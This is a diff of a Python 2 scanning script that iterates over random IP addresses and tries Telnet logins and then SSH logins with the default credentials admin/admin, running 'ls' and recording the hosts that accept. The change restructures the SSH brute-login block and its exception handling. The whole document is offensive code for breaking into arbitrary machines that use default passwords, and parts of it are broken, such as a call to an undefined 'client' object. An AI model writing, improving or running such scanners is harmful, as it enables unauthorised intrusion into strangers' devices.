@@ -76,26 +76,6 @@ for address in randip():
 				tn.write("exit\n")
 				print tn.read_all()
 				d.append(tn.read_all())
-				try:
-					print('Starting SSH Attempt on %s' % address)
-					SSH = paramiko.SSHClient()
-					SSH.connect(address, username='admin', password='admin')
-					stdin, stdout, stderr = client.exec_command('ls')
-					for line in stdout:
-						print '... ' + line.strip('\n')
-					client.close()
-					f.append(address)
-				except SSHException:
-					print(SSHException, 'SSH Could not connect', address)
-					g.append(address)
-					pass
-				except AuthenticationException:
-					print(AuthenticationException, 'Error logging into SSH' ,  address)
-					g.append(address)
-					pass
-				except KeyboardInterrupt:
-					WriteLog()
-					break
 			except socket.error:
 				print(socket.error, 'Error Signing in or Telnet not accesable', address)
 				print '\n'
@@ -103,6 +83,26 @@ for address in randip():
 				pass
 			except EOFError:
 				print(EOFError, address)
+				pass
+			except KeyboardInterrupt:
+				WriteLog()
+				break
+			try:
+				print('Starting SSH Attempt on %s' % address)
+				SSH = paramiko.SSHClient()
+				SSH.connect(address, username='admin', password='admin')
+				stdin, stdout, stderr = client.exec_command('ls')
+				for line in stdout:
+					print '... ' + line.strip('\n')
+				client.close()
+				f.append(address)
+			except paramiko.ssh_exception.SSHException:
+				print(paramiko.ssh_exception.SSHException, 'SSH Could not connect', address)
+				g.append(address)
+				pass
+			except paramiko.ssh_exception.AuthenticationException:
+				print(paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address)
+				g.append(address)
 				pass
 			except KeyboardInterrupt:
 				WriteLog()
